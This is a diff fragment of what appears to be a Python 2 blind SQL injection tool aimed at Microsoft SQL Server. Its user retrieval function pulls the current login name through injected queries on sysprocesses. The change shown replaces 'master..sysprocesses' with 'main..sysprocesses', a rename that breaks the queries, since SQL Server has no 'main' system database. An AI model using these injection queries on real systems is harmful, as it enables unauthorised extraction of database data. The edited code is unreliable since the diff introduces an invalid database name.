@@ -247,10 +247,10 @@ def user():
 	print '[+] Starting user retrieval'
 	#For some reason, we need to detect length first as it doesn't respond with nulls
 	
-	sqlquery = 'select LEN(a.loginame) from master..sysprocesses as a where a.spid=@@SPID'
+	sqlquery = 'select LEN(a.loginame) from main..sysprocesses as a where a.spid=@@SPID'
 	userlen = getnumericvalue(sqlquery)
 	
-	sqlquery = 'select a.loginame from master..sysprocesses as a where a.spid=@@SPID'
+	sqlquery = 'select a.loginame from main..sysprocesses as a where a.spid=@@SPID'
 	loginname = getstringvalue(sqlquery,0,userlen)
 	
 	sqlquery = 'select LEN(user)'
